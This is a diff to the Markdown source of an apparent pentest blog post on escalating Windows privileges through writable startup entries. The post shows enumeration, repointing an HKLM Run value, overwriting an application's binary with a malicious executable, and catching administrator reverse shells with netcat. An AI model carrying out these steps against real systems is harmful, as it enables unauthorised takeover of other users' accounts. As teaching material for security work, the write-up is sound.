@@ -1,6 +1,7 @@
 ---
-title: "Modifiable Registry Autorun & Startup Binary"
+title: Modifiable Registry Autorun & Startup Binary
 date: 2026-06-19 18:53:35
+
 categories:
   - Active Directory
   - Windows
@@ -8,8 +9,6 @@ categories:
   - Windows Privesc
   - Services
 tags:
-  - msfvenom
-  - Windows-Privesc
   - Startup-Apps
   - Logon-Autorun
   - Run-Keys
@@ -17,12 +16,22 @@ tags:
   - Win32_StartupCommand
   - Weak-ACL
   - AccessChk
+  - msfvenom
   - icacls
+  - Windows-Privesc
+cover: /img/startup-apps.png
+top_img: /img/bg-img.jpg
+description: Identify and exploit writable startup applications on Windows by overwriting the referenced binary or repointing a Run registry value, executing code as the next user to log in for privilege escalation.
 ---
 
-> ➜ Startup applications run automatically when a user logs in, via `Run` registry keys (`HKLM` / `HKCU`) or the Startup folder. If we can overwrite the referenced executable or modify the registry value that points to it, our binary will run under the account that logs in next.
 
+
+
+
+> ➜ Startup applications run automatically when a user logs in, via `Run` registry keys (`HKLM` / `HKCU`) or the Startup folder. If we can overwrite the referenced executable or modify the registry value that points to it, our binary will run under the account that logs in next.
+> 
 # Enumeration
+
 
 > ➜ We query the `Win32_StartupCommand` WMI class to list startup entries, then check the `Location` and `User` fields to find one run by a privileged user whose binary we can overwrite.
 
@@ -35,11 +44,13 @@ Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 User     : Public
 ```
 
-> ➜ An entry under `HKLM\...\Run` (or `User : Public`) runs for every user, so whichever privileged account logs in next will execute it. An entry confined to our own user’s hive (`HKU\<our-SID>`) only runs as us and gives no escalation.
+> ➜ An entry under `HKLM\...\Run` (or `User : Public`) runs for every user, so whichever privileged account logs in next will execute it. An entry confined to our own user's hive (`HKU\<our-SID>`) only runs as us and gives no escalation.
 
 # Exploitation
 
+
 ## Path 1 : Modifying the Registry Run Value
+
 
 #### Checking Our Permissions on the `Run` Key
 
@@ -66,7 +77,7 @@ PS C:\> Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\
 
 #### Getting a Shell
 
-> ➜ On the target user’s next logon, the startup entry runs our payload and we receive a shell as that user.
+> ➜ On the target user's next logon, the startup entry runs our payload and we receive a shell as that user.
 
 ```bash
 ➜  startup-apps rlwrap nc -lvnp port
@@ -78,6 +89,7 @@ target-domain\administrator
 ```
 
 ## Path 2 :Overwriting the Referenced Binary
+
 
 #### Confirming Write Access on the Referenced Binary
 
@@ -107,7 +119,7 @@ rlwrap nc -lvnp port
 
 #### Replacing the Binary
 
-> ➜ We overwrite the legitimate executable with our payload, then wait, this attack is passive, so nothing fires until the target user logs in and we don’t control when that happens.
+> ➜ We overwrite the legitimate executable with our payload, then wait, this attack is passive, so nothing fires until the target user logs in and we don't control when that happens.
 
 ```cmd
 C:\> copy /Y malicious.exe "C:\Program Files\app-name\app-name.exe"
@@ -115,7 +127,7 @@ C:\> copy /Y malicious.exe "C:\Program Files\app-name\app-name.exe"
 
 #### Getting a Shell
 
-> ➜ On the target user’s next logon, the startup entry runs our payload and we receive a shell as that user.
+> ➜ On the target user's next logon, the startup entry runs our payload and we receive a shell as that user.
 
 ```bash
 ➜  startup-apps rlwrap nc -lvnp port
@@ -125,3 +137,4 @@ connect to [ip] from (UNKNOWN) [target-ip] 49xxx
 C:\WINDOWS\system32> whoami
 target-domain\administrator
 ```
+
